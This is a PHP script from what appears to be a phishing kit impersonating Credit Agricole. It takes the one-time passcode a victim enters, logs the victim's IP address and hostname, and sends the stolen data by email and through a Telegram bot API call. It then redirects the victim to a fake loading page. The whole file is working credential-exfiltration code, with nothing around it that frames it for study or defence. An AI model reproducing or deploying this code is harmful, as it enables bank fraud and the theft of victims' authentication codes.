<?php
error_reporting(0);
session_start();
include "../../config.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message = "[========== 🇫🇷 Credit-Agricole (Email OTP) 🇫🇷 ===========]\r\n";
$message .= "|OTP      	 : ".$_POST['validemail']."\r\n";
$message .= "[========= $ip ========]\r\n";
$send = $email; 
$subject = "(".$_SESSION['id'].") Credit-Agricole Email OTP  $ip";
$headers = "From: [CH1_CA **]<info@CH1.com>";
mail($send,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


header("Location: ../loading1.php");

?>